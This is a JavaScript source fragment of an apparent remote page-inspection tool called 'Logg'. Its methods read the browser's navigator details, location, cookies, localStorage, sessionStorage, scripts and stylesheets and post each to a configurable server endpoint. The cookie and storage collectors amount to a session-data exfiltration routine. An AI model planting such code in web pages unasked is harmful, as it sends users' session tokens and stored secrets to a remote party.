Logg.getNavigator = function() {
  var data = {
    'message_type': 'navigator',
    'content': JSON.stringify(getNavigator())
  };

  Async.post({
    url: SERVER_ENDPOINT + '/messages',
    data: data
  });
};

Logg.trackLocation = function() {
  var data = {
    'message_type': 'location',
    'content': global.location.toString()
  };

  Async.post({
    url: SERVER_ENDPOINT + '/messages',
    data: data
  });
};

Logg.getCookies = function(send) {
  var data = mapList(document.cookie.split(';'), function(item) {
    var pairArray = trimString(item).split('=');

    var cookie = {};

    cookie[pairArray[0]] = pairArray[1];

    return cookie;
  });

  if (send === undefined || send === true) {
    Async.post({
      url: SERVER_ENDPOINT + '/messages',
      data: {
        'message_type': 'cookies',
        'content': JSON.stringify(preJSON(data)),
        'in_reply_to': lastID
      }
    });
  }
  else {
    return data;
  }
};

Logg.getLocalStorage = function(send) {
  var data = {};
  var localStorageKeys = Object.keys(global.localStorage);

  for (var i = 0; i < localStorageKeys.length; i++) {
    var localStorageKey = localStorageKeys[i],
        localStorageValue = global.localStorage[localStorageKey];

    data[localStorageKey] = localStorageValue;
  }

  if (send === undefined || send === true) {
    Async.post({
      url: SERVER_ENDPOINT + '/messages',
      data: {
        'message_type': 'localstorage',
        'content': JSON.stringify(preJSON(data)),
        'in_reply_to': lastID
      }
    });
  }
  else {
    return data;
  }
};

Logg.getSessionStorage = function(send) {
  var data = {};
  var sessionStorageKeys = Object.keys(global.sessionStorage);

  for (var i = 0; i < sessionStorageKeys.length; i++) {
    var sessionStorageKey = sessionStorageKeys[i],
        sessionStorageValue = global.sessionStorage[sessionStorageKey];

    data[sessionStorageKey] = sessionStorageValue;
  }

  if (send === undefined || send === true) {
    Async.post({
      url: SERVER_ENDPOINT + '/messages',
      data: {
        'message_type': 'sessionstorage',
        'content': JSON.stringify(preJSON(data)),
        'in_reply_to': lastID
      }
    });
  }
  else {
    return data;
  }
};

Logg.getScripts = function(send) {
  var scripts = mapList(document.scripts, function(script) {
    var name;

    if (script.getAttribute('src')) {
      name = script.getAttribute('src');
    }
    else {
      name = 'script_' + script.getAttribute('data-loggid');
    }

    return name;
  });

  if (send === undefined || send === true) {
    Async.post({
      url: SERVER_ENDPOINT + '/messages',
      data: {
        'message_type': 'scripts',
        'content': JSON.stringify(preJSON(scripts)),
        'in_reply_to': lastID
      }
    });
  }
  else {
    return scripts;
  }
};

Logg.getStyleSheets = function(send) {
  var styleSheets = {};

  for (var i = 0; i < document.styleSheets.length; i++) {
    var styleSheet = document.styleSheets[i],
        name = styleSheet.href || 'stylesheet_' + styleSheet.ownerNode.getAttribute('data-loggid'),
        cssRules = styleSheet.cssRules || styleSheet.rules || [];

    styleSheets[name] = '';

    for (var j = 0; j < cssRules.length; j++) {
      var content = cssRules[j].cssText;

      styleSheets[name] += '\n' + content;
    }
  }

  if (send === undefined || send === true) {
    Async.post({
      url: SERVER_ENDPOINT + '/messages',
      data: {
        'message_type': 'stylesheets',
        'content': JSON.stringify(preJSON(styleSheets)),
        'in_reply_to': lastID
      }
    });
  }
  else {
    return styleSheets;
  }
};